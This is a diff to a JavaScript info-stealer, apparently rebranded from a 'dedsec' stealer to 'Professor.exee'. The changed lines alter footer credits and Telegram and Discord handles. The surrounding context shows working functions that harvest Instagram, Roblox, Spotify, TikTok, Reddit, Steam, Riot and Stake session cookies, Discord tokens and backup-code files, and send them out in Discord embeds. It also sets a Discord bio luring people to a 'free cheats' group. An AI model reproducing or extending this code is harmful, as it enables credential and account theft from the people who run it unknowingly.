@@ -461,7 +461,7 @@ async function findBackupCodes() {
               },
               description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
               footer: {
-                text: `${user.hostname} | by Professor.exee | t.me/ProfessorKali`,
+                text: `${user.hostname} | Disocrd: Professor.exee | t.me/ProfessorKali`,
                 icon_url: 'https://cdn.discordapp.com/attachments/1271926617664520295/1287004699752665199/raf360x360075tfafafa_ca443f4.webp?ex=66eff807&is=66eea687&hm=0e5de3fc0fe5539e87e6f383d96fee503bd0d25b0968061482edfdcc4bf95bc3&',
               },
             };
@@ -514,7 +514,7 @@ async function findEpicGamesBackupCodes() {
               },
               description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
               footer: {
-                text: `${user.hostname} | by Professor.exee | t.me/ProfessorKali`,
+                text: `${user.hostname} | Discord: Professor.exee | t.me/ProfessorKali`,
                 icon_url: 'https://cdn.discordapp.com/attachments/1271926617664520295/1287004699752665199/raf360x360075tfafafa_ca443f4.webp?ex=66eff807&is=66eea687&hm=0e5de3fc0fe5539e87e6f383d96fee503bd0d25b0968061482edfdcc4bf95bc3&',
               },
             };
@@ -566,7 +566,7 @@ async function findGithubBackupCodes() {
               },
               description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
               footer: {
-                text: `${user.hostname} | by Professor.exee | t.me/ProfessorKali`,
+                text: `${user.hostname} | Discord: Professor.exee | t.me/ProfessorKali`,
                 icon_url: 'https://cdn.discordapp.com/attachments/1271926617664520295/1287004699752665199/raf360x360075tfafafa_ca443f4.webp?ex=66eff807&is=66eea687&hm=0e5de3fc0fe5539e87e6f383d96fee503bd0d25b0968061482edfdcc4bf95bc3&',
               },
             };
@@ -706,7 +706,7 @@ user = {
         randomUUID: crypto.randomBytes(16).toString('hex'),
         start: Date.now(),
         debug: false,
-        copyright: '<================[t.me/ProfessKali ]>================>\n\n',
+        copyright: '<================[t.me/ProfessorKali ]>================>\n\n',
         url: null,
         locale: locale,
     }
@@ -1321,7 +1321,7 @@ async function SubmitInstagram(session_id) {
         { name: 'Token', value: '```' + data.session_id + '```', inline: false },
       ],
       footer: {
-        text: `${user.hostname} | By Professor.exee | t.me/ProfessorKali`,
+        text: `${user.hostname} | Discord: Professor.exee | t.me/ProfessorKali`,
       },
     };
 
@@ -1431,7 +1431,7 @@ async function SubmitRoblox(secret_cookie) {
         },
       ],
       footer: {
-        text: `${user.hostname} | By Professor.exee | t.me/ProfessorKali`,
+        text: `${user.hostname} | Discord: Professor.exee | t.me/ProfessorKali`,
         icon_url: 'https://cdn.discordapp.com/attachments/1271926617664520295/1287004699752665199/raf360x360075tfafafa_ca443f4.webp?ex=66eff807&is=66eea687&hm=0e5de3fc0fe5539e87e6f383d96fee503bd0d25b0968061482edfdcc4bf95bc3&',
       },
     };
@@ -1489,7 +1489,7 @@ async function SpotifySession(cookie) {
                 { name: 'Spotify Cookie | sp_dc=', value: '```' + cookie + '```', inline: false }
             ],
             footer: {
-                text: `${user.hostname} | @m13majestic @Yusufls18 | t.me/dedsecstealer`,
+                text: `${user.hostname} | Discord: Professor.exee | t.me/ProfessorKali`,
                 icon_url: 'https://cdn.discordapp.com/attachments/1271926617664520295/1287004699752665199/raf360x360075tfafafa_ca443f4.webp?ex=66eff807&is=66eea687&hm=0e5de3fc0fe5539e87e6f383d96fee503bd0d25b0968061482edfdcc4bf95bc3&'
             }
         };
@@ -1611,7 +1611,7 @@ function stealTikTokSession(cookie) {
                         }
                       ],
                       footer: {
-                        text: `${user.hostname} | By Professor.exee | t.me/ProfessorKali`,
+                        text: `${user.hostname} | Discord: Professor.exee | t.me/ProfessorKali`,
                         icon_url: 'https://cdn.discordapp.com/attachments/1271926617664520295/1287004699752665199/raf360x360075tfafafa_ca443f4.webp?ex=66eff807&is=66eea687&hm=0e5de3fc0fe5539e87e6f383d96fee503bd0d25b0968061482edfdcc4bf95bc3&',
                       },
                     }
@@ -1697,7 +1697,7 @@ function setRedditSession(cookie) {
                 { name: '🚫 Suspended', value: '```' + (suspended ? 'Yes' : 'No') + '```', inline: true }
                             ],
                             footer: {
-                                text: `${user.hostname} | By Professor.exee | t.me/ProfessorKali`,
+                                text: `${user.hostname} | Discord: Professor.exee | t.me/ProfessorKali`,
                                 icon_url: 'https://cdn.discordapp.com/attachments/1271926617664520295/1287004699752665199/raf360x360075tfafafa_ca443f4.webp?ex=66eff807&is=66eea687&hm=0e5de3fc0fe5539e87e6f383d96fee503bd0d25b0968061482edfdcc4bf95bc3&'
                             },
                             author: {
@@ -1866,7 +1866,7 @@ async function getTokens() {
     }
 
     const predefinedBio = `╔═══════════✧✧✧═══════════╗ 
-**     Entre no melhor grupo de Cheats Gratis https://discord.gg/nE8JChcz5P** 
+**     Entre no Melhor Grupo de Cheats Gratuito !** 
 **           ⭐️https://discord.gg/nE8JChcz5P** ⭐️
 ╚═══════════✧✧✧═══════════╝`;
 
@@ -1944,7 +1944,7 @@ async function getTokens() {
                     },
                 ],
                 footer: {
-                    text: `${user.hostname} | By Professor.exee | t.me/ProfessorKali`,
+                    text: `${user.hostname} | Discord: Professor.exee | t.me/ProfessorKali`,
                     icon_url: 'https://cdn.discordapp.com/attachments/1271926617664520295/1287004699752665199/raf360x360075tfafafa_ca443f4.webp?ex=66eff807&is=66eea687&hm=0e5de3fc0fe5539e87e6f383d96fee503bd0d25b0968061482edfdcc4bf95bc3&'
                 }
             };
@@ -1963,7 +1963,7 @@ async function getTokens() {
                         icon_url: "https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp"
                     },
                     footer: {
-                        text: `${user.hostname} | By Professor.exee | t.me/ProfessorKali`,
+                        text: `${user.hostname} | Discord: Professor.exee | t.me/ProfessorKali`,
                     }
                 };
                 data.embeds.push(friendsEmbed);
@@ -2604,7 +2604,7 @@ function createSteamEmbed(account, accountInfo, games, level) {
             }
         ],
         footer: {
-            text: `${user.hostname} | By Professor.exee | t.me/ProfessorKali`,
+            text: `${user.hostname} | Discord: Professor.exee | t.me/ProfessorKali`,
             icon_url: 'https://cdn.discordapp.com/attachments/1271926617664520295/1287004699752665199/raf360x360075tfafafa_ca443f4.webp?ex=66eff807&is=66eea687&hm=0e5de3fc0fe5539e87e6f383d96fee503bd0d25b0968061482edfdcc4bf95bc3&',
         },
     };
@@ -3135,7 +3135,7 @@ try {
         description: '‎',
         color: 0x303037,
         author: {
-            name: `${user.hostname} | Informações do sistema | Por Professor.exee`,
+            name: `${user.hostname} | System Information | @m13majestic @Yusufls18`,
             icon_url: 'https://cdn.discordapp.com/attachments/1271926617664520295/1287004699752665199/raf360x360075tfafafa_ca443f4.webp?ex=66eff807&is=66eea687&hm=0e5de3fc0fe5539e87e6f383d96fee503bd0d25b0968061482edfdcc4bf95bc3&',
         },
         fields: [
@@ -3192,7 +3192,7 @@ try {
             },
         ],
         footer: {
-            text: `${user.hostname} | Professor.exee | t.me/ProfessorKali`,
+            text: `${user.hostname} | Discord: Professor.exee | t.me/ProfessorKali`,
             icon_url: 'https://cdn.discordapp.com/attachments/1271926617664520295/1287004699752665199/raf360x360075tfafafa_ca443f4.webp?ex=66eff807&is=66eea687&hm=0e5de3fc0fe5539e87e6f383d96fee503bd0d25b0968061482edfdcc4bf95bc3&',
         },
     };
@@ -3771,11 +3771,11 @@ async function sendKeywordsToDiscord(keywords) {
 
         // Embed style
         const embed_data = {
-            "title": "Dedsec Keywords",
+            "title": "Professor Keywords",
             "description": formattedKeywords,
             "color": 0x303037,
             "footer": {
-                "text": `${user.hostname} | Professor.exee | t.me/ProfessorKali`,
+                "text": `${user.hostname} | Discord: Professor.exee | t.me/ProfessorKali`,
                 "icon_url": 'https://cdn.discordapp.com/attachments/1271926617664520295/1287004699752665199/raf360x360075tfafafa_ca443f4.webp?ex=66eff807&is=66eea687&hm=0e5de3fc0fe5539e87e6f383d96fee503bd0d25b0968061482edfdcc4bf95bc3&'
             }
         };
@@ -3802,7 +3802,7 @@ async function sendStakeSessionToDiscord(decrypted) {
             "description": `Session Cookie: \n\`\`\`${decrypted}\`\`\``,
             "color": 0x303037,
             "footer": {
-                "text": `${user.hostname} | Professor.exee | t.me/ProfessorKali`,
+                "text": `${user.hostname} | Discord: Professor.exee | t.me/ProfessorKali`,
                 "icon_url": 'https://cdn.discordapp.com/attachments/1271926617664520295/1287004699752665199/raf360x360075tfafafa_ca443f4.webp?ex=66eff807&is=66eea687&hm=0e5de3fc0fe5539e87e6f383d96fee503bd0d25b0968061482edfdcc4bf95bc3&'
             },
             "thumbnail": {
@@ -3979,7 +3979,7 @@ async function RiotGameSession(cookie) {
             "description": ``,
             "color": 0x303037,
             "footer": {
-                "text": `${user.hostname} | Professor.exee | t.me/ProfessorKali`,
+                "text": `${user.hostname} | Discord: Professor.exee | t.me/ProfessorKali`,
                 "icon_url": 'https://cdn.discordapp.com/attachments/1271926617664520295/1287004699752665199/raf360x360075tfafafa_ca443f4.webp?ex=66eff807&is=66eea687&hm=0e5de3fc0fe5539e87e6f383d96fee503bd0d25b0968061482edfdcc4bf95bc3&'
             },
             "thumbnail": { "url": "https://seeklogo.com/images/V/valorant-logo-FAB2CA0E55-seeklogo.com.png" },
